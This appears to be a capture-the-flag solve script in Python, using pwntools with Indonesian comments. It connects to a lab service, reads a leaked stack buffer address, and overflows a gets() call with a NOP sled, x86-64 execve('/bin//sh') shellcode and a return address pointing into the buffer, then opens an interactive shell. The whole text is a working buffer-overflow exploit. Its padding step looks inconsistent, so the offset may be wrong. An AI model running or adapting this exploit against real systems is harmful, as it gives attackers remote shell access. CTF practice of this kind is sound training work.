from pwn import *

# Ganti port sesuai soal
p = remote("sisterlab.id", 42071)

# Langkah 1: Baca sampai leak alamat buffer
p.recvuntil(b"0x")
addr_leak = b"0x" + p.recvline().strip()
buffer_addr = int(addr_leak, 16)
log.info(f"Leaked buffer address: {hex(buffer_addr)}")

# Langkah 2: Kirim "n" agar masuk ke gets()
p.sendline(b"n")

# Langkah 3: Kirim payload shellcode + ret addr
shellcode = (
    b"\x48\x31\xc0\x50\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"
    b"\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"
)
nop = b"\x90" * 20
payload = nop + shellcode
payload = payload.ljust(23, b"\x90") + p64(buffer_addr)

# Kirim payload tepat setelah gets() diminta
p.sendline(payload)

# Interaktif shell jika berhasil
p.interactive()
